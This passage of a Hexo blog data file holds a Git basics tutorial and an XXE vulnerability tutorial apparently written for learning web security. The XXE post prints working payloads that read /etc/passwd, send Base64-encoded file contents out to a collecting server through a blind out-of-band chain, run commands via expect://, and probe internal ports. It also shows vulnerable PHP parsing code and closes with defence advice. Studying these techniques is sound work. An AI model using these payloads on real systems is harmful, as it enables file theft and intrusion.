":1550719942290},{"_id":"source/_posts/文件上传漏洞/20180712092548-81b98800-85-1.png","hash":"c50e562da447c4af959ae04e9ce885ad77439d83","modified":1551834521964},{"_id":"themes/yelee/source/css/_partial/customise/blockquote.styl","hash":"5e6edb9ad49288743ed550a2bd8c9a3c8e208455","modified":1550719942252},{"_id":"themes/yelee/source/css/_partial/customise/code-block.styl","hash":"4db1a992a06fd92b779f0afc9bb8bb3667bdb101","modified":1550719942254},{"_id":"themes/yelee/source/css/_partial/customise/color-scheme.styl","hash":"b58262a9f8903e75df431291745e19ccd8ff243a","modified":1550719942256},{"_id":"themes/yelee/source/css/_partial/customise/heading.styl","hash":"c29799f09ebd87767fd9cc3b1fa795db44a94670","modified":1550719942258},{"_id":"themes/yelee/source/css/_partial/customise/inline-code.styl","hash":"a15292b2b3541ea022c0fb7441875192dee5ad9d","modified":1550719942260},{"_id":"themes/yelee/source/css/_partial/customise/list.styl","hash":"7db683e2837a078ad7817fb88914535588e49cfa","modified":1550719942264},{"_id":"themes/yelee/source/css/_partial/customise/social-icon.styl","hash":"ab06c3bcbd91ca12afa0c1019b0cc8493d4e471a","modified":1550729480187},{"_id":"source/_posts/hack-zico/11.png","hash":"930b3ac1ca5656c62165aea740057f77b732fbbd","modified":1551248057149},{"_id":"source/_posts/hack-zico/9.png","hash":"acb10cf629182e0bbb2f4deb00278069d0950061","modified":1551247372873},{"_id":"source/_posts/hack-zico/8.png","hash":"3c35429441deb160e6bc6ceb4fd74549a9d2ae4b","modified":1551246491266},{"_id":"source/_posts/XXE/InkedQQ截图20190301091748_LI.jpg","hash":"5356a5bde995f0b3b1273eb6d4acead0d42ca05e","modified":1551410392784}],"Category":[{"name":"Misc","_id":"cjszpjg880004j8r028j93o29"},{"name":"WEB漏洞学习","_id":"cjszpjg8g0009j8r0vnnxwefc"},{"name":"Vulnhub","_id":"cjszpjg98000jj8r0ssrjjfy3"},{"name":"漏洞复现","_id":"cjszpjg9e000oj8r0gg34zgms"},{"name":"语言","_id":"cjszpjg9h000uj8r0hmupfa7g"}],"Data":[],"Page":[{"title":"about","date":"2019-02-21T06:14:25.000Z","_content":"\n## 关于我\n\n**The quiter you become,the more you are able to hear.**\n\n\n\nEmail：wusup3rb@163.com\n\nWechat：WuSup3rb","source":"about/index.md","raw":"---\ntitle: about\ndate: 2019-02-21 14:14:25\n---\n\n## 关于我\n\n**The quiter you become,the more you are able to hear.**\n\n\n\nEmail：wusup3rb@163.com\n\nWechat：WuSup3rb","updated":"2019-02-22T02:51:35.225Z","path":"about/index.html","comments":1,"layout":"page","_id":"cjszpjg7u0000j8r0vprm815j","content":"<h2 id=\"关于我\"><a href=\"#关于我\" class=\"headerlink\" title=\"关于我\"></a>关于我</h2><p><strong>The quiter you become,the more you are able to hear.</strong></p>\n<p>Email：<a href=\"mailto:wusup3rb@163.com\" target=\"_blank\" rel=\"noopener\">wusup3rb@163.com</a></p>\n<p>Wechat：WuSup3rb</p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"关于我\"><a href=\"#关于我\" class=\"headerlink\" title=\"关于我\"></a>关于我</h2><p><strong>The quiter you become,the more you are able to hear.</strong></p>\n<p>Email：<a href=\"mailto:wusup3rb@163.com\" target=\"_blank\" rel=\"noopener\">wusup3rb@163.com</a></p>\n<p>Wechat：WuSup3rb</p>\n"},{"title":"tags","date":"2019-02-21T06:17:20.000Z","_content":"","source":"tags/index.md","raw":"---\ntitle: tags\ndate: 2019-02-21 14:17:20\n---\n","updated":"2019-02-21T06:17:20.184Z","path":"tags/index.html","comments":1,"layout":"page","_id":"cjszpjg840002j8r0ays3as73","content":"","site":{"data":{}},"excerpt":"","more":""}],"Post":[{"title":"Git基本命令及使用","date":"2019-02-22T06:04:26.000Z","_content":"\n## 0x00 Git概述\n\n*Git*是一个开源的分布式版本控制系统,用于敏捷高效地处理任何或小或大的项目。\n\n<!-- more -->\n\n## 0x01 Git安装\n\n到官网下载安装程序安装即可：https://git-scm.com/\n\n## 0x02 基本操作\n\n> **`git   init`  **     #初始化当前目录，表示对当前目录进行版本控制。该步骤是对某一目录进行版本控制的第一步。\n\n> **`git status`**       #查看当前目录文件状态。（红色文件表示未加入版本控制，绿色表示已加入但未提交版本）\n>\n> - PS：对文件进行修改变动后，git会自动发现并变为红色，此时又需要git add变为绿色\n\n> **`git add  <filename> `**    #将指定文件加入版本控制。（加入后git status查看红色变为绿色）\n> **`git add  .  `**          #将当前目录下的所有文件加入版本控制。\n\n> **`git commit -m`** \"详细描述信息\"       #提交一个版本。即生成一次版本快照。版本号是随意生成的MD5值。\n\n> **`git log `**         #版本创建/变更日志。\n> **`git reflog`**     #同上，但更详细。\n>\n> > 可通过这两条命令看到变更的记录，更直白一点就是可以获取版本号用于变更版本。\n\n> **`git reset --hard <版本号>` **    #切换状态到指定的版本（快照）\n\n> **`git branch`  ** #查看分支列表。一个项目可以用众多分支，分支之间拷贝的，即互相独立不影响。默认是master\n>\n> **`git branch <分支名称>`**         #创建一个新分支。（创建的分支是当前所在分支的拷贝，本质是两份独立的拷贝）\n> **`git branch -d <分支名称>`**     #删除指定分支\n>\n> **`git checkout <分支名称>`**     #进入指定分支\n>\n> **`git merge <分支名称>`**          #将指定分支与当前所在分支进行合并。\n\n## 0x03 连接Github\n\n> **`git remote add  <github仓库地址别名>    <github仓库地址>`**        \n>\n> > 别名是为了避免记网址，对应关系会被记录在.git目录的config文件中。\n>\n>\n>\n> **`git clone  <github项目网址>`**      #克隆下载项目\n>\n> **`git pull <github网址别名>  <分支名称>`**    #从github拉取指定分支代码。\n>\n> > 上面条等价于下面两条：\n> > ​\t\t**`git fetch   <github网址别名>    <分支名称> `**\n> > ​\t\t**`git merge   <github网址别名>   <分支名称>`**\n>\n> **`git push <github网址别名>   <分支名称>`**  #将当前所在分支推到github上。\n\n## 0x04 将某些文件隔离出版本控制\n\n- 在工作目录下创建**.gitignore**文件\n- 文件的编写格式内容\n\n```\n*.sql    #表示所有后缀为.sql的文件都被隔离\n*.pyc\t #表示所有后缀为.pyc的文件都被隔离\na.txt\t #表示隔离a.txt\n```\n\n#### 教程博客与参考链接\n\n- https://www.cnblogs.com/wupeiqi/p/7295372.html\n- http://www.ruanyifeng.com/blog/2018/10/git-internals.html\n- http://www.ruanyifeng.com/blog/2015/12/git-workflow.html\n- http://www.ruanyifeng.com/blog/2015/12/git-cheat-sheet.html","source":"_posts/GitNote.md","raw":"---\ntitle: Git基本命令及使用\ndate: 2019-02-22 14:04:26\ntags: 必会技能\ncategories: Misc\n---\n\n## 0x00 Git概述\n\n*Git*是一个开源的分布式版本控制系统,用于敏捷高效地处理任何或小或大的项目。\n\n<!-- more -->\n\n## 0x01 Git安装\n\n到官网下载安装程序安装即可：https://git-scm.com/\n\n## 0x02 基本操作\n\n> **`git   init`  **     #初始化当前目录，表示对当前目录进行版本控制。该步骤是对某一目录进行版本控制的第一步。\n\n> **`git status`**       #查看当前目录文件状态。（红色文件表示未加入版本控制，绿色表示已加入但未提交版本）\n>\n> - PS：对文件进行修改变动后，git会自动发现并变为红色，此时又需要git add变为绿色\n\n> **`git add  <filename> `**    #将指定文件加入版本控制。（加入后git status查看红色变为绿色）\n> **`git add  .  `**          #将当前目录下的所有文件加入版本控制。\n\n> **`git commit -m`** \"详细描述信息\"       #提交一个版本。即生成一次版本快照。版本号是随意生成的MD5值。\n\n> **`git log `**         #版本创建/变更日志。\n> **`git reflog`**     #同上，但更详细。\n>\n> > 可通过这两条命令看到变更的记录，更直白一点就是可以获取版本号用于变更版本。\n\n> **`git reset --hard <版本号>` **    #切换状态到指定的版本（快照）\n\n> **`git branch`  ** #查看分支列表。一个项目可以用众多分支，分支之间拷贝的，即互相独立不影响。默认是master\n>\n> **`git branch <分支名称>`**         #创建一个新分支。（创建的分支是当前所在分支的拷贝，本质是两份独立的拷贝）\n> **`git branch -d <分支名称>`**     #删除指定分支\n>\n> **`git checkout <分支名称>`**     #进入指定分支\n>\n> **`git merge <分支名称>`**          #将指定分支与当前所在分支进行合并。\n\n## 0x03 连接Github\n\n> **`git remote add  <github仓库地址别名>    <github仓库地址>`**        \n>\n> > 别名是为了避免记网址，对应关系会被记录在.git目录的config文件中。\n>\n>\n>\n> **`git clone  <github项目网址>`**      #克隆下载项目\n>\n> **`git pull <github网址别名>  <分支名称>`**    #从github拉取指定分支代码。\n>\n> > 上面条等价于下面两条：\n> > ​\t\t**`git fetch   <github网址别名>    <分支名称> `**\n> > ​\t\t**`git merge   <github网址别名>   <分支名称>`**\n>\n> **`git push <github网址别名>   <分支名称>`**  #将当前所在分支推到github上。\n\n## 0x04 将某些文件隔离出版本控制\n\n- 在工作目录下创建**.gitignore**文件\n- 文件的编写格式内容\n\n```\n*.sql    #表示所有后缀为.sql的文件都被隔离\n*.pyc\t #表示所有后缀为.pyc的文件都被隔离\na.txt\t #表示隔离a.txt\n```\n\n#### 教程博客与参考链接\n\n- https://www.cnblogs.com/wupeiqi/p/7295372.html\n- http://www.ruanyifeng.com/blog/2018/10/git-internals.html\n- http://www.ruanyifeng.com/blog/2015/12/git-workflow.html\n- http://www.ruanyifeng.com/blog/2015/12/git-cheat-sheet.html","slug":"GitNote","published":1,"updated":"2019-02-25T01:33:39.930Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjszpjg7w0001j8r0i3vhkg5e","content":"<h2 id=\"0x00-Git概述\"><a href=\"#0x00-Git概述\" class=\"headerlink\" title=\"0x00 Git概述\"></a>0x00 Git概述</h2><p><em>Git</em>是一个开源的分布式版本控制系统,用于敏捷高效地处理任何或小或大的项目。</p>\n<a id=\"more\"></a>\n<h2 id=\"0x01-Git安装\"><a href=\"#0x01-Git安装\" class=\"headerlink\" title=\"0x01 Git安装\"></a>0x01 Git安装</h2><p>到官网下载安装程序安装即可：<a href=\"https://git-scm.com/\" target=\"_blank\" rel=\"noopener\">https://git-scm.com/</a></p>\n<h2 id=\"0x02-基本操作\"><a href=\"#0x02-基本操作\" class=\"headerlink\" title=\"0x02 基本操作\"></a>0x02 基本操作</h2><blockquote>\n<p><strong><code>git   init</code>  </strong>     #初始化当前目录，表示对当前目录进行版本控制。该步骤是对某一目录进行版本控制的第一步。</p>\n</blockquote>\n<blockquote>\n<p><strong><code>git status</code></strong>       #查看当前目录文件状态。（红色文件表示未加入版本控制，绿色表示已加入但未提交版本）</p>\n<ul>\n<li>PS：对文件进行修改变动后，git会自动发现并变为红色，此时又需要git add变为绿色</li>\n</ul>\n</blockquote>\n<blockquote>\n<p><strong><code>git add  &lt;filename&gt;</code></strong>    #将指定文件加入版本控制。（加入后git status查看红色变为绿色）<br><strong><code>git add  .</code></strong>          #将当前目录下的所有文件加入版本控制。</p>\n</blockquote>\n<blockquote>\n<p><strong><code>git commit -m</code></strong> “详细描述信息”       #提交一个版本。即生成一次版本快照。版本号是随意生成的MD5值。</p>\n</blockquote>\n<blockquote>\n<p><strong><code>git log</code></strong>         #版本创建/变更日志。<br><strong><code>git reflog</code></strong>     #同上，但更详细。</p>\n<blockquote>\n<p>可通过这两条命令看到变更的记录，更直白一点就是可以获取版本号用于变更版本。</p>\n</blockquote>\n</blockquote>\n<blockquote>\n<p><strong><code>git reset --hard &lt;版本号&gt;</code> </strong>    #切换状态到指定的版本（快照）</p>\n</blockquote>\n<blockquote>\n<p><strong><code>git branch</code>  </strong> #查看分支列表。一个项目可以用众多分支，分支之间拷贝的，即互相独立不影响。默认是master</p>\n<p><strong><code>git branch &lt;分支名称&gt;</code></strong>         #创建一个新分支。（创建的分支是当前所在分支的拷贝，本质是两份独立的拷贝）<br><strong><code>git branch -d &lt;分支名称&gt;</code></strong>     #删除指定分支</p>\n<p><strong><code>git checkout &lt;分支名称&gt;</code></strong>     #进入指定分支</p>\n<p><strong><code>git merge &lt;分支名称&gt;</code></strong>          #将指定分支与当前所在分支进行合并。</p>\n</blockquote>\n<h2 id=\"0x03-连接Github\"><a href=\"#0x03-连接Github\" class=\"headerlink\" title=\"0x03 连接Github\"></a>0x03 连接Github</h2><blockquote>\n<p><strong><code>git remote add  &lt;github仓库地址别名&gt;    &lt;github仓库地址&gt;</code></strong>        </p>\n<blockquote>\n<p>别名是为了避免记网址，对应关系会被记录在.git目录的config文件中。</p>\n</blockquote>\n<p><strong><code>git clone  &lt;github项目网址&gt;</code></strong>      #克隆下载项目</p>\n<p><strong><code>git pull &lt;github网址别名&gt;  &lt;分支名称&gt;</code></strong>    #从github拉取指定分支代码。</p>\n<blockquote>\n<p>上面条等价于下面两条：<br>​        <strong><code>git fetch   &lt;github网址别名&gt;    &lt;分支名称&gt;</code></strong><br>​        <strong><code>git merge   &lt;github网址别名&gt;   &lt;分支名称&gt;</code></strong></p>\n</blockquote>\n<p><strong><code>git push &lt;github网址别名&gt;   &lt;分支名称&gt;</code></strong>  #将当前所在分支推到github上。</p>\n</blockquote>\n<h2 id=\"0x04-将某些文件隔离出版本控制\"><a href=\"#0x04-将某些文件隔离出版本控制\" class=\"headerlink\" title=\"0x04 将某些文件隔离出版本控制\"></a>0x04 将某些文件隔离出版本控制</h2><ul>\n<li>在工作目录下创建<strong>.gitignore</strong>文件</li>\n<li>文件的编写格式内容</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">*.sql    #表示所有后缀为.sql的文件都被隔离</span><br><span class=\"line\">*.pyc\t #表示所有后缀为.pyc的文件都被隔离</span><br><span class=\"line\">a.txt\t #表示隔离a.txt</span><br></pre></td></tr></table></figure>\n<h4 id=\"教程博客与参考链接\"><a href=\"#教程博客与参考链接\" class=\"headerlink\" title=\"教程博客与参考链接\"></a>教程博客与参考链接</h4><ul>\n<li><a href=\"https://www.cnblogs.com/wupeiqi/p/7295372.html\" target=\"_blank\" rel=\"noopener\">https://www.cnblogs.com/wupeiqi/p/7295372.html</a></li>\n<li><a href=\"http://www.ruanyifeng.com/blog/2018/10/git-internals.html\" target=\"_blank\" rel=\"noopener\">http://www.ruanyifeng.com/blog/2018/10/git-internals.html</a></li>\n<li><a href=\"http://www.ruanyifeng.com/blog/2015/12/git-workflow.html\" target=\"_blank\" rel=\"noopener\">http://www.ruanyifeng.com/blog/2015/12/git-workflow.html</a></li>\n<li><a href=\"http://www.ruanyifeng.com/blog/2015/12/git-cheat-sheet.html\" target=\"_blank\" rel=\"noopener\">http://www.ruanyifeng.com/blog/2015/12/git-cheat-sheet.html</a></li>\n</ul>\n","site":{"data":{}},"excerpt":"<h2 id=\"0x00-Git概述\"><a href=\"#0x00-Git概述\" class=\"headerlink\" title=\"0x00 Git概述\"></a>0x00 Git概述</h2><p><em>Git</em>是一个开源的分布式版本控制系统,用于敏捷高效地处理任何或小或大的项目。</p>","more":"<h2 id=\"0x01-Git安装\"><a href=\"#0x01-Git安装\" class=\"headerlink\" title=\"0x01 Git安装\"></a>0x01 Git安装</h2><p>到官网下载安装程序安装即可：<a href=\"https://git-scm.com/\" target=\"_blank\" rel=\"noopener\">https://git-scm.com/</a></p>\n<h2 id=\"0x02-基本操作\"><a href=\"#0x02-基本操作\" class=\"headerlink\" title=\"0x02 基本操作\"></a>0x02 基本操作</h2><blockquote>\n<p><strong><code>git   init</code>  </strong>     #初始化当前目录，表示对当前目录进行版本控制。该步骤是对某一目录进行版本控制的第一步。</p>\n</blockquote>\n<blockquote>\n<p><strong><code>git status</code></strong>       #查看当前目录文件状态。（红色文件表示未加入版本控制，绿色表示已加入但未提交版本）</p>\n<ul>\n<li>PS：对文件进行修改变动后，git会自动发现并变为红色，此时又需要git add变为绿色</li>\n</ul>\n</blockquote>\n<blockquote>\n<p><strong><code>git add  &lt;filename&gt;</code></strong>    #将指定文件加入版本控制。（加入后git status查看红色变为绿色）<br><strong><code>git add  .</code></strong>          #将当前目录下的所有文件加入版本控制。</p>\n</blockquote>\n<blockquote>\n<p><strong><code>git commit -m</code></strong> “详细描述信息”       #提交一个版本。即生成一次版本快照。版本号是随意生成的MD5值。</p>\n</blockquote>\n<blockquote>\n<p><strong><code>git log</code></strong>         #版本创建/变更日志。<br><strong><code>git reflog</code></strong>     #同上，但更详细。</p>\n<blockquote>\n<p>可通过这两条命令看到变更的记录，更直白一点就是可以获取版本号用于变更版本。</p>\n</blockquote>\n</blockquote>\n<blockquote>\n<p><strong><code>git reset --hard &lt;版本号&gt;</code> </strong>    #切换状态到指定的版本（快照）</p>\n</blockquote>\n<blockquote>\n<p><strong><code>git branch</code>  </strong> #查看分支列表。一个项目可以用众多分支，分支之间拷贝的，即互相独立不影响。默认是master</p>\n<p><strong><code>git branch &lt;分支名称&gt;</code></strong>         #创建一个新分支。（创建的分支是当前所在分支的拷贝，本质是两份独立的拷贝）<br><strong><code>git branch -d &lt;分支名称&gt;</code></strong>     #删除指定分支</p>\n<p><strong><code>git checkout &lt;分支名称&gt;</code></strong>     #进入指定分支</p>\n<p><strong><code>git merge &lt;分支名称&gt;</code></strong>          #将指定分支与当前所在分支进行合并。</p>\n</blockquote>\n<h2 id=\"0x03-连接Github\"><a href=\"#0x03-连接Github\" class=\"headerlink\" title=\"0x03 连接Github\"></a>0x03 连接Github</h2><blockquote>\n<p><strong><code>git remote add  &lt;github仓库地址别名&gt;    &lt;github仓库地址&gt;</code></strong>        </p>\n<blockquote>\n<p>别名是为了避免记网址，对应关系会被记录在.git目录的config文件中。</p>\n</blockquote>\n<p><strong><code>git clone  &lt;github项目网址&gt;</code></strong>      #克隆下载项目</p>\n<p><strong><code>git pull &lt;github网址别名&gt;  &lt;分支名称&gt;</code></strong>    #从github拉取指定分支代码。</p>\n<blockquote>\n<p>上面条等价于下面两条：<br>​        <strong><code>git fetch   &lt;github网址别名&gt;    &lt;分支名称&gt;</code></strong><br>​        <strong><code>git merge   &lt;github网址别名&gt;   &lt;分支名称&gt;</code></strong></p>\n</blockquote>\n<p><strong><code>git push &lt;github网址别名&gt;   &lt;分支名称&gt;</code></strong>  #将当前所在分支推到github上。</p>\n</blockquote>\n<h2 id=\"0x04-将某些文件隔离出版本控制\"><a href=\"#0x04-将某些文件隔离出版本控制\" class=\"headerlink\" title=\"0x04 将某些文件隔离出版本控制\"></a>0x04 将某些文件隔离出版本控制</h2><ul>\n<li>在工作目录下创建<strong>.gitignore</strong>文件</li>\n<li>文件的编写格式内容</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">*.sql    #表示所有后缀为.sql的文件都被隔离</span><br><span class=\"line\">*.pyc\t #表示所有后缀为.pyc的文件都被隔离</span><br><span class=\"line\">a.txt\t #表示隔离a.txt</span><br></pre></td></tr></table></figure>\n<h4 id=\"教程博客与参考链接\"><a href=\"#教程博客与参考链接\" class=\"headerlink\" title=\"教程博客与参考链接\"></a>教程博客与参考链接</h4><ul>\n<li><a href=\"https://www.cnblogs.com/wupeiqi/p/7295372.html\" target=\"_blank\" rel=\"noopener\">https://www.cnblogs.com/wupeiqi/p/7295372.html</a></li>\n<li><a href=\"http://www.ruanyifeng.com/blog/2018/10/git-internals.html\" target=\"_blank\" rel=\"noopener\">http://www.ruanyifeng.com/blog/2018/10/git-internals.html</a></li>\n<li><a href=\"http://www.ruanyifeng.com/blog/2015/12/git-workflow.html\" target=\"_blank\" rel=\"noopener\">http://www.ruanyifeng.com/blog/2015/12/git-workflow.html</a></li>\n<li><a href=\"http://www.ruanyifeng.com/blog/2015/12/git-cheat-sheet.html\" target=\"_blank\" rel=\"noopener\">http://www.ruanyifeng.com/blog/2015/12/git-cheat-sheet.html</a></li>\n</ul>"},{"title":"XXE（XML External Entity）漏洞","date":"2019-03-01T00:59:43.000Z","_content":"\n## 0x00 必备XML基础知识\n\nDTD（文档类型定义）的作用是定义 XML 文档的合法构建模块。DTD 可以在 XML 文档内声明，也可以外部引用。\n\nDTD实体是用于定义引用普通文本或特殊字符的快捷方式的变量，可以内部声明或外部引用。实体的声明是在DTD声明里面的，属于DTD声明的一部分。\n\n<!-- more -->\n\n![](XXE\\InkedQQ截图20190301091748_LI.jpg)\n\n更多XML基础知识跳转[这里](https://sakuxa.com/2019/02/28/xml/)。\n\n## 0x01 XXE漏洞概述\n\nXXE -\"xml external entity injection\"即\"xml外部实体注入漏洞\"。\n\n攻击者通过向服务器注入指定的xml实体内容,从而让服务器按照指定的配置进行执行,导致问题。\n也就是说服务端接收和解析了来自用户端的xml数据,而又没有做严格的安全控制,从而导致xml外部实体注入。\n\n在PHP里面解析xml用的是libxml,其在≥2.9.0的版本中,默认是禁止解析xml外部实体内容的。可以使用phpinfo()查看libxml的版本信息。 \n\n![](XXE\\QQ截图20190301093413.png)\n\n**漏洞检测：**\n\n首先，检测XML是否会被解析。`&xxe;`是否会被解析为\"this is xxe\".(注意：GET请求时记得把`&`进行URL编码)\n\n> Payload:`<!DOCTYPE ANY [ <!ENTITY xxe \"this is xxe..\"> ]> <x>&xxe;</x>`\n\n然后，检测服务器是否支持外部实体。执行Payload后查看`test.com`服务器的http访问日志，看是否存在`GET /xxe_test HTTP/1.0`的请求，若存在则证明支持外部实体。\n\n> Payload:`<!DOCTYPE ANY [ <!ENTITY xxe SYSTEM  \"http://test.com/xxe_test\"> ]><x>&xxe;</x>`\n\n## 0x02 恶意引入外部实体\n\n**情景一：**\n\n```\n<?xml version=\"1.0\"?>\n<!DOCTYPE note [    \n  <!ELEMENT note any>   \n \n  <!ENTITY xxe SYSTEM \"file:///etc/passwd\" >\n]>\n\n<note> &xxe; </note>\n```\n\n**情景二：**\n\n```\n<?xml version=\"1.0\"?>\n<!DOCTYPE note [    \n  <!ELEMENT note any>   \n \n  <!ENTITY % hack SYSTEM \"hack.dtd\" >\n  % hack  //会被hack.dtd的内容替换。\n]>\n\n<note> &xxe; </note>\n```\n\n`hack.dtd`文件内容：\n\n```\n<!ENTITY xxe SYSTEM \"file:///etc/passwd\" >\n```\n\n**情景三：**\n\n```\n<?xml version=\"1.0\"?>\n<!DOCTYPE note SYSTEM \"hack.dtd\">\n\n<note> &xxe; </note>\n```\n\n`hack.dtd`文件内容：\n\n```\n<!ENTITY xxe SYSTEM \"file:///etc/passwd\" >\n```\n\n**外部引用实体时，不同的程序可以使用的协议不一样：**\n\n![](XXE\\15129735161149.png)\n\n## 0x03 XXE漏洞利用\n\n利用xxe漏洞可以进行拒绝服务攻击，文件读取，命令(代码)执行，SQL(XSS)注入，内外扫描端口，入侵内网站点等，内网探测和入侵是利用xxe中支持的协议进行内网主机和端口发现，可以理解是使用XXE进行SSRF的利用。\n\n一般XXE利用分为两大场景：有回显和无回显。\n\n> - 有回显的情况可以直接在页面中看到Payload的执行结果或现象。\n> - 无回显的情况又称为Blind XXE，可以使用带外数据通道提取数据。\n\n基本漏洞源码：\n\n```\n<?php\n    $xml=simplexml_load_string($_REQUEST['xml']);\n    echo \"<p>$xml</p>\"\n?>\n```\n\n**1.任意文件读取：**\n\n**有回显的情况：**\n\nPayload:`<!DOCTYPE note [<!ELEMENT note ANY ><!ENTITY xxe SYSTEM \"file:///S://aa.txt\">]><note>&xxe;</note>` \n\n![](S:\\hexo\\myblog\\source\\_posts\\XXE\\QQ截图20190301133421.png)\n\n![](XXE\\QQ截图20190301133122.png)\n\n**无回显的情况：**\n\n`%file;`会调用php插件对要读取的文件内容进行Base64编码。\n\n`%dtd;`会请求我们编写好的`evil.xml`文件，会被`evil.xml`文件内容替换。\n\n`%payload;`被`<!ENTITY &#x25; send SYSTEM 'http://localhost/?content=%file;'>`替换。\n\n`%send;`会向我们的服务器发送一次请求，请求的参数是被编码的文件内容，此时我们去查看`http`的访问日志就能看到被编码的文件内容，进行Base64解码就能得到文件内容。\n\nPayload:\n\n```\n<!DOCTYPE note [ \n  <!ELEMENT note ANY >\n  <!ENTITY % file SYSTEM \"php://filter/convert.base64-encode/resource=/S:/test.txt\">\n  <!ENTITY % dtd SYSTEM \"http://localhost/evil.xml\">\n  %dtd; %payload; %send;  ]>\n```\n\n`evil.xml`文件内容：内部`send`的`%`要用实体：`&#x25;`\n\n```\n<!ENTITY % payload \"<!ENTITY &#x25; send SYSTEM 'http://localhost/?content=%file;'>\"> \n```\n\n`http`访问日志：（到配置文件`http.conf`里找到`CustomLog \"logs/access.log\" common`并删除掉`#`号注释）\n\n![](XXE\\QQ截图20190301152037.png)\n\n**PS:**之所以要引入文件`evil.xml`原因是不能在实体定义中引用参数实体，即有些解释器不允许在内层实体中使用外部连接，无论内层是一般实体还是参数实体。\n\nBase64解码：\n\n![](XXE\\QQ截图20190301152528.png)\n\n**2.命令执行：**\n\n安装了expect扩展的PHP环境可以执行系统命令，其他协议也有可能存在其他执行系统命令的方法。\n\n[expect](http://php.net/manual/zh/wrappers.expect.php)封装协议默认未开启。\n\nPayload:`<!DOCTYPE ANY [ <!ENTITY xxe SYSTEM \"expect://whoami\"> ]><x>&xxe;</x>`\n\n**3.内网端口探测：**\n\nPayload:`<!DOCTYPE ANY [ <!ENTITY xxe SYSTEM \"http://localhost:81\"> ]><x>%26xxe;</x>`\n\n## 0x04 漏洞防御\n\n- 尽可能使用简单的数据格式（如：JSON），避免对敏感数据进行序列化。\n- 及时修复或更新应用程序或底层操作系统使用的所有XML处理器和库。\n- 在服务器端实施积极的（“白名单”）输入验证、过滤和清理，以防止在XML文档、标题或节点中出现恶意数据。关键词：<!DOCTYPE和<!ENTITY，或者，SYSTEM和PUBLIC。\n- 使用开发语言提供的禁用外部实体的方法。\n\n**参考链接：**\n\nhttps://github.com/JnuSimba/MiscSecNotes/blob/master/XML%E6%B3%A8%E5%85%A5/XXE%E6%BC%8F%E6%B4%9E.md\n\nhttps://www.cnblogs.com/backlion/p/9302528.html\n\nhttps://www.jianshu.com/p/77f2181587a4","source":"_posts/XXE.md","raw":"---\ntitle: XXE（XML External Entity）漏洞\ndate: 2019-03-01 08:59:43\ntags: \n\t- XXE\n\t- XML注入\n\t- OWASP Top10 2017\ncategories: WEB漏洞学习\n---\n\n## 0x00 必备XML基础知识\n\nDTD（文档类型定义）的作用是定义 XML 文档的合法构建模块。DTD 可以在 XML 文档内声明，也可以外部引用。\n\nDTD实体是用于定义引用普通文本或特殊字符的快捷方式的变量，可以内部声明或外部引用。实体的声明是在DTD声明里面的，属于DTD声明的一部分。\n\n<!-- more -->\n\n![](XXE\\InkedQQ截图20190301091748_LI.jpg)\n\n更多XML基础知识跳转[这里](https://sakuxa.com/2019/02/28/xml/)。\n\n## 0x01 XXE漏洞概述\n\nXXE -\"xml external entity injection\"即\"xml外部实体注入漏洞\"。\n\n攻击者通过向服务器注入指定的xml实体内容,从而让服务器按照指定的配置进行执行,导致问题。\n也就是说服务端接收和解析了来自用户端的xml数据,而又没有做严格的安全控制,从而导致xml外部实体注入。\n\n在PHP里面解析xml用的是libxml,其在≥2.9.0的版本中,默认是禁止解析xml外部实体内容的。可以使用phpinfo()查看libxml的版本信息。 \n\n![](XXE\\QQ截图20190301093413.png)\n\n**漏洞检测：**\n\n首先，检测XML是否会被解析。`&xxe;`是否会被解析为\"this is xxe\".(注意：GET请求时记得把`&`进行URL编码)\n\n> Payload:`<!DOCTYPE ANY [ <!ENTITY xxe \"this is xxe..\"> ]> <x>&xxe;</x>`\n\n然后，检测服务器是否支持外部实体。执行Payload后查看`test.com`服务器的http访问日志，看是否存在`GET /xxe_test HTTP/1.0`的请求，若存在则证明支持外部实体。\n\n> Payload:`<!DOCTYPE ANY [ <!ENTITY xxe SYSTEM  \"http://test.com/xxe_test\"> ]><x>&xxe;</x>`\n\n## 0x02 恶意引入外部实体\n\n**情景一：**\n\n```\n<?xml version=\"1.0\"?>\n<!DOCTYPE note [    \n  <!ELEMENT note any>   \n \n  <!ENTITY xxe SYSTEM \"file:///etc/passwd\" >\n]>\n\n<note> &xxe; </note>\n```\n\n**情景二：**\n\n```\n<?xml version=\"1.0\"?>\n<!DOCTYPE note [    \n  <!ELEMENT note any>   \n \n  <!ENTITY % hack SYSTEM \"hack.dtd\" >\n  % hack  //会被hack.dtd的内容替换。\n]>\n\n<note> &xxe; </note>\n```\n\n`hack.dtd`文件内容：\n\n```\n<!ENTITY xxe SYSTEM \"file:///etc/passwd\" >\n```\n\n**情景三：**\n\n```\n<?xml version=\"1.0\"?>\n<!DOCTYPE note SYSTEM \"hack.dtd\">\n\n<note> &xxe; </note>\n```\n\n`hack.dtd`文件内容：\n\n```\n<!ENTITY xxe SYSTEM \"file:///etc/passwd\" >\n```\n\n**外部引用实体时，不同的程序可以使用的协议不一样：**\n\n![](XXE\\15129735161149.png)\n\n## 0x03 XXE漏洞利用\n\n利用xxe漏洞可以进行拒绝服务攻击，文件读取，命令(代码)执行，SQL(XSS)注入，内外扫描端口，入侵内网站点等，内网探测和入侵是利用xxe中支持的协议进行内网主机和端口发现，可以理解是使用XXE进行SSRF的利用。\n\n一般XXE利用分为两大场景：有回显和无回显。\n\n> - 有回显的情况可以直接在页面中看到Payload的执行结果或现象。\n> - 无回显的情况又称为Blind XXE，可以使用带外数据通道提取数据。\n\n基本漏洞源码：\n\n```\n<?php\n    $xml=simplexml_load_string($_REQUEST['xml']);\n    echo \"<p>$xml</p>\"\n?>\n```\n\n**1.任意文件读取：**\n\n**有回显的情况：**\n\nPayload:`<!DOCTYPE note [<!ELEMENT note ANY ><!ENTITY xxe SYSTEM \"file:///S://aa.txt\">]><note>&xxe;</note>` 